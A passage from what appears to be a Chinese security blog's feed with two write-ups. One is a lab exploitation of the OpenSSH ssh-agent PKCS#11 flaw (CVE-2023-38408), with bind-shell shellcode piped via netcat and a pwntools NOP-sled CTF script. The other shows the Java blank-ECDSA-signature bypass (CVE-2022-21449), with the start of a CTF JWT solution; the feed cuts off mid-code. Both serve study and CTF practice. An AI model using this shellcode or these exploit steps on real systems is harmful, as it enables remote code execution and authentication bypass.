    <published>2023-12-27T15:56:20.000Z</published>
    <updated>2024-01-27T01:27:57.410Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008" alt="img"></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>SSHï¼ˆSecure Shellï¼‰æ˜¯ä¸€ç§åŠ å¯†çš„ç½‘ç»œä¼ è¾“åè®®ã€‚ä¸»è¦ç”¨æ¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹å®‰å…¨é€šä¿¡éš§é“ã€‚ä½¿ç”¨SSHè¿›è¡Œè¿œç¨‹ç™»å½•ï¼Œä¿¡æ¯ä¼ è¾“æ˜¯åŠ å¯†çš„ï¼Œå³ä½¿ä¿¡æ¯è¢«ä¸­é€”æˆªè·ä¹Ÿä¸ä¼šæ³„éœ²ã€‚OpenSSHè½¯ä»¶å¥—ä»¶è´Ÿè´£SSHåè®®çš„å®ç°ã€‚</p><p>23å¹´ä¸ƒæœˆçˆ†å‡ºæ¥OpenSSH(9.3p2ç‰ˆæœ¬ä»¥å‰)çš„ä¸€ä¸ªCVEï¼Œç”¨æˆ·ä½¿ç”¨ SSH-Agent ä»£ç†è½¬å‘åŠŸèƒ½è¿æ¥æ”»å‡»è€…æ¶æ„æœåŠ¡å™¨æ—¶ï¼Œç”±äº SSH-Agent æœªå¯¹åŠ è½½çš„å…±äº«åº“è¿›è¡Œé™åˆ¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡å°†æ¶æ„å…±äº«åº“ä½œä¸ºå‚æ•°ä¼ é€’ç»™ SSH-Agent å¹¶é€šè¿‡å…¶è°ƒç”¨ dlopen&#x2F;dlclose å‡½æ•°åŠ è½½ &#x2F; å¸è½½ä½äºç”¨æˆ·å®¢æˆ·ç«¯ä¸»æœºçš„å…±äº«åº“ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><p>æ”»å‡»æµç¨‹å¦‚å›¾ï¼š</p><p><img src="https://github.com/LucasPDiniz/CVE-2023-38408/raw/main/img/poc.JPG" alt="img"></p><ul><li>æ”»å‡»è€…é€šè¿‡SSHè¿æ¥åˆ°æœåŠ¡å™¨</li><li>Aliceä¹Ÿé€šè¿‡SSHè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œæ­¤æ—¶Aliceä½¿ç”¨SSHè½¬å‘ä»£ç†è¿æ¥åˆ°æ”»å‡»è€…ã€‚</li><li>æ”»å‡»è€…åˆ›å»ºshellcode, é€šè¿‡sshè¿›ç¨‹å‘é€ç»™ç›®æ ‡æœåŠ¡å™¨</li><li>shellcodeåˆ©ç”¨ssh-agentçš„PKCS#11æ¼æ´åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼ŒåŠ«æŒAliceçš„sshè®¿é—®æƒé™</li><li>æˆåŠŸæ‰§è¡Œè¯¥æ”»å‡»åï¼Œæ”»å‡»è€…å¯èƒ½ä¼šè®¿é—®ç»‘å®šshellï¼ˆshellä»£ç ï¼‰ï¼Œè¯¥shellå¯ä»¥ä½¿ç”¨netcatè¿›è¡Œè®¿é—®ã€‚</li></ul><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>ç›®æ ‡ï¼šæå‡redqueenrebelæƒé™ï¼ŒæŸå®³aliceè´¦æˆ·</p><p>æœºå™¨ï¼š</p><ul><li>workstation: å—å®³è€…æœºå™¨</li><li>kali æ”»å‡»è€…æœºå™¨</li></ul><p>ç”¨æˆ·ï¼š</p><ul><li>redqueenrebel: éç‰¹æƒç”¨æˆ·</li><li>alice: workstationçš„rootç”¨æˆ·</li><li>root: hacker</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>é¦–å…ˆæˆ‘ä»¬å·²ç»å®Œæˆæ”»å‡»çš„ç¬¬ä¸€ã€äºŒæ­¥ï¼Œä¹Ÿå³ä¸¤ä¸ªç”¨æˆ·å·²ç»æœ‰æƒé€šè¿‡SSHè®¿é—®æœåŠ¡å™¨ã€‚</p><ol><li><p>è·å–åœ¨è¿œç¨‹æ”»å‡»è€…è®¡ç®—æœºä¸Šè¿è¡Œçš„ SSH ä»£ç†çš„ PID ï¼Œå¹¶å¯¼å‡ºåˆ°ç¯å¢ƒå˜é‡ã€‚æˆ‘ä»¬è¿˜é€šè¿‡ ssh-add æ·»åŠ äº†æ–‡ä»¶ linuxx64.elf.stubï¼ˆUEFI å¼•å¯¼å­˜æ ¹ï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /tmp/ssh-*/agent.*</span><br><span class="line"><span class="built_in">export</span> SSH_AUTH_SOCK=/tmp/ssh-NqLP6il36s/agent.3452</span><br><span class="line">ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042335331.png" alt="image-20240104233548210"></p><ol start="2"><li><p>é€šè¿‡SSHæŠŠ shellcodeå¤åˆ¶åˆ°è¿›ç¨‹ä¸­</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHELLCODE=$<span class="string">&#x27;\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05&#x27;</span></span><br><span class="line">(perl -e <span class="string">&#x27;print &quot;\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6&quot; . &quot;\x90&quot; x 10000&#x27;</span>; <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$SHELLCODE</span>&quot;</span>) | nc -U <span class="string">&quot;<span class="variable">$SSH_AUTH_SOCK</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>ä¸€æ—¦ shellcode æˆåŠŸæ”¾å…¥ä»£ç†å†…å­˜ä¸­ï¼Œç›´æ¥æŒ‰CtrlCï¼Œåœæ­¢ netcat ä¼ è¾“ã€‚</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042337741.png" alt="image-20240104233746664"></p><ol start="3"><li><p>é€šè¿‡ssh-addä¸Šä¼ ï¼šibttcn3-rt2-dynamic.soã€libKF5SonnetUi.so.5.92.0 å’Œ libns3.35-wave.so.0.0.0ï¼Œè§¦å‘<strong>SIGSEGV</strong>æ¼æ´ã€‚</p><blockquote><p><code>SIGSEGV</code> æ˜¯Linuxå’Œç±»Unixç³»ç»Ÿä¸­çš„ä¸€ä¸ªä¿¡å·ï¼Œå®ƒè¡¨ç¤ºâ€Segmentation Faultâ€ï¼ˆåˆ†æ®µé”™è¯¯ï¼‰ã€‚å½“ä¸€ä¸ªç¨‹åºå°è¯•è®¿é—®æœªåˆ†é…ç»™å®ƒçš„å†…å­˜åŒºåŸŸï¼Œæˆ–è€…è®¿é—®å·²ç»è¢«é‡Šæ”¾çš„å†…å­˜åŒºåŸŸï¼Œå°±ä¼šè§¦å‘ <code>SIGSEGV</code> ä¿¡å·ã€‚æ”¶åˆ° SIGSEGV ä¿¡å·åï¼Œå†…æ ¸ä¼šè¯†åˆ«å‡ºå‘ç”Ÿäº†æ— æ•ˆå†…å­˜è®¿é—®ï¼Œå¹¶ç»§ç»­è°ƒç”¨è‡ªå®šä¹‰ä¿¡å·å¤„ç†ç¨‹åºï¼Œè€Œä¸æ˜¯çªç„¶ç»ˆæ­¢ç¨‹åºã€‚æ­¤æ—¶æ”»å‡»è€…ä¼šæ“çºµç¨‹åºçš„æ‰§è¡Œï¼Œå¹¶å°†å…¶å¼•å¯¼è‡³ä½äº NOP é›ªæ©‡å†…çš„æ³¨å…¥æ¶æ„ä»£ç ã€‚</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line">ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0</span><br><span class="line">[Enter <span class="keyword">for</span> passphrase]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>æˆåŠŸæAliceçš„æƒï¼Œæ˜ å°„åˆ°ç«¯å£31337ä¸Šã€‚</p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401042352811.png" alt="image-20240104235222726" style="zoom: 50%;" /></li></ol><h2 id="PS1-nop-sled"><a href="#PS1-nop-sled" class="headerlink" title="PS1 nop-sled"></a>PS1 nop-sled</h2><p>nopæ˜¯ä¸€æ¡ä¸åšä»»ä½•æ“ä½œçš„å•æŒ‡ä»¤ï¼Œå¯¹åº”çš„åå…­è¿›åˆ¶ç¼–ç ä¸º0x90ã€‚è¿™é‡Œnopå°†è¢«ç”¨ä½œæ¬ºéª—å› å­ã€‚é€šè¿‡åˆ›å»ºä¸€ä¸ªå¤§çš„NOPæŒ‡ä»¤æ•°ç»„å¹¶å°†å…¶æ”¾åœ¨shellcodeä¹‹å‰ï¼Œå¦‚æœEIPè¿”å›åˆ°å­˜å‚¨nop sledçš„ä»»æ„åœ°å€ï¼Œé‚£ä¹ˆåœ¨è¾¾åˆ°shellcodeä¹‹å‰ï¼Œæ¯æ‰§è¡Œä¸€æ¡nopæŒ‡ä»¤ï¼ŒEIPéƒ½ä¼šé€’å¢ã€‚è¿™å°±æ˜¯è¯´åªè¦è¿”å›åœ°å€è¢«nop sledä¸­çš„æŸä¸€åœ°å€æ‰€é‡å†™ï¼ŒEIPå°±ä¼šå°†sledæ»‘å‘å°†æ­£å¸¸æ‰§è¡Œçš„shellcodeã€‚<br>ä»¥ä¸€ä¸ªç®€å•ç¨‹åºçš„pwnè§£é‡Šï¼š</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052031291.png" alt="image-20240105203131190"></p><p>32ä½ï¼Œcanaryä¿æŠ¤å¼€äº†ï¼Œä½†æ²¡å¼€NXå’ŒPIEï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥æŠŠshellcodeå†™åˆ°æ ˆä¸Šæ‰§è¡Œçš„ã€‚</p><p>åæ±‡ç¼–mainå‡½æ•°æ—¶æŠ¥é”™ï¼š</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052122346.png" alt="image-20240105212226312"></p><p>ç”±äºF5åœ¨åˆ†æè°ƒç”¨æ—¶ï¼Œæœªèƒ½æˆåŠŸè§£æå‚æ•°ä½ç½®&#x2F;å‚æ•°ä¸ªæ•°ï¼Œ<br>è§£å†³æ–¹æ³•ï¼šå°±æ˜¯å…ˆundefineæ‰å‡½æ•°ï¼Œåœ¨å³é”®ç°åœ¨code,ä¹‹åCreat function å°±å¯ä»¥æ­£å¸¸åç¼–è¯‘äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [esp+4h] [ebp-100Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+1004h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// [esp+1008h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+1010h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v8 = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)&amp;seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  v3 = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> sub_8048A22(v5, (<span class="type">int</span>)&amp;savedregs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>query_positionå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºæ‰§è¡Œé€»è¾‘æ˜¯ï¼š</p><ul><li>è¾“å‡ºæ ˆä¸­çš„åœ°å€</li><li>è¾“å…¥å­—ç¬¦ä¸²èµ‹ç»™seed</li><li>è¾“å…¥åœ°å€èµ‹ç»™v5</li><li>ä½¿ç”¨v5()ï¼Œä»è¾“å…¥çš„åœ°å€ï¼Œæ‰§è¡Œè¯¥åœ°å€çš„ä»£ç </li></ul><p>å¦‚æœåœ¨æ ˆä¸­çš„æŸä¸ªä½ç½®å¡«å…¥å¤§é‡nopæŒ‡ä»¤å†æ¥ä¸Šshellcodeï¼Œéšåæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµä»nopæŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼Œåˆ™ç¨‹åºå°±ä¼šä¸€ç›´æ‰§è¡Œä¹‹å‰å¡«å…¥çš„nopï¼Œç„¶åå°±æ˜¯shellcodeï¼Œä»è€ŒæˆåŠŸpwnæ‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;xxxx&quot;</span>,<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;current location: &quot;</span>)</span><br><span class="line"><span class="comment"># æ¥æ”¶position</span></span><br><span class="line">addr = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"><span class="comment"># \x90ä¸ºnopæŒ‡ä»¤</span></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># è¾“è¿›v5çš„åœ°å€</span></span><br><span class="line">shell_addr = addr + <span class="number">0x2d</span> + <span class="number">668</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(shell_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401052351754.png" alt="image-20240105235100666"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;&lt;img src=&quot;https://iototsecnews.files.wordpress.com/2023/07/openssh.png?w=1008&quot; alt=&quot;img&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-21449-Brief-analysis</title>
    <link href="http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/"/>
    <id>http://example.com/2023/12/27/CVE-2022-21449-Brief-analysis/</id>
    <published>2023-12-27T07:36:51.000Z</published>
    <updated>2023-12-27T07:39:44.514Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ECDSAä»£è¡¨æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•ï¼Œä¸æ—§çš„RSAç­¾åç›¸æ¯”ï¼ŒECDSAç­¾åé•¿åº¦æ›´çŸ­ï¼Œå› æ­¤åº”ç”¨é¢è¾ƒå¹¿ï¼Œä¾‹å¦‚å„ç§JWTåœºæ™¯ã€‚æœåŠ¡å™¨ä½¿ç”¨java15~18ç‰ˆæœ¬çš„ECDSAï¼Œä¼šå—åˆ°æ”»å‡»è€…ç»•è¿‡çš„å½±å“ã€‚ç”±äºECDSAæœªå¯¹æäº¤çš„rå’Œså€¼åšä»”ç»†çš„æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯é€šè¿‡å°†ä¸º0çš„rå’Œsä½œä¸ºå‚æ•°æäº¤ç»™æœåŠ¡å™¨ï¼Œå®ç°ç»•è¿‡éªŒç­¾çš„è¿‡ç¨‹ã€‚</p><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>JShell â€“ ç‰ˆæœ¬ 15.0.2</p><h2 id="æ”»å‡»è¿‡ç¨‹"><a href="#æ”»å‡»è¿‡ç¨‹" class="headerlink" title="æ”»å‡»è¿‡ç¨‹"></a>æ”»å‡»è¿‡ç¨‹</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jshell&gt; <span class="keyword">import</span> java.security.*</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">keys</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>).generateKeyPair()</span><br><span class="line">keys ==&gt; java.security.KeyPair@63e31ee</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">blankSignature</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">64</span>]</span><br><span class="line">blankSignature ==&gt; <span class="type">byte</span>[<span class="number">64</span>] &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, ... , <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">jshell&gt; <span class="type">var</span> <span class="variable">sig</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256WithECDSAInP1363Format&quot;</span>)</span><br><span class="line">sig ==&gt; Signature object: SHA256WithECDSAInP1363Format&lt;not initialized&gt;</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.initVerify(keys.getPublic())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.update(<span class="string">&quot;Hello, World&quot;</span>.getBytes())</span><br><span class="line"></span><br><span class="line">jshell&gt; sig.verify(blankSignature)</span><br><span class="line">$<span class="number">7</span> ==&gt; <span class="literal">true</span></span><br><span class="line"><span class="comment">// æˆåŠŸç»•è¿‡éªŒç­¾</span></span><br></pre></td></tr></table></figure><h2 id="æŠ€æœ¯ç»†èŠ‚"><a href="#æŠ€æœ¯ç»†èŠ‚" class="headerlink" title="æŠ€æœ¯ç»†èŠ‚"></a>æŠ€æœ¯ç»†èŠ‚</h2><p>ECDSAç­¾åç”±ä¸¤ä¸ªå€¼ç»„æˆï¼Œç§°ä¸ºrå’Œsã€‚éªŒç­¾éœ€è¦æ£€æŸ¥çš„å«æœ‰r, s, å…¬é’¥å’Œæ¶ˆæ¯çš„æ‘˜è¦å€¼çš„æ–¹ç¨‹ã€‚æ–¹ç¨‹ä¸€ä¾§æ˜¯r, å¦ä¸€ä¾§åŒ…å«rå’Œsã€‚å› æ­¤å¦‚æœrå’Œså‡ä¸º0ï¼Œåˆ™æ–¹ç¨‹ç»“æœæ˜¯$0&#x3D;0\times \alpha(something)$, ä»è€Œæ–¹ç¨‹æˆç«‹ï¼ŒéªŒç­¾é€šè¿‡ã€‚</p><h2 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h2><p>jwtä¸€èˆ¬ä¼šå¯¹å‚æ•°ç¼–ç ï¼Œæ•…é’ˆå¯¹ç‰¹å®šåœºæ™¯ï¼Œéœ€è¦æ„é€ ä¸åŒçš„payloadã€‚</p><p>å¼ºç½‘æ¯2022 <strong>myJWT</strong> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDSA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> KeyPair <span class="title function_">keyGen</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;EC&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">384</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="keyword">return</span> keyPair;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] sign(<span class="type">byte</span>[] str, ECPrivateKey privateKey) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> 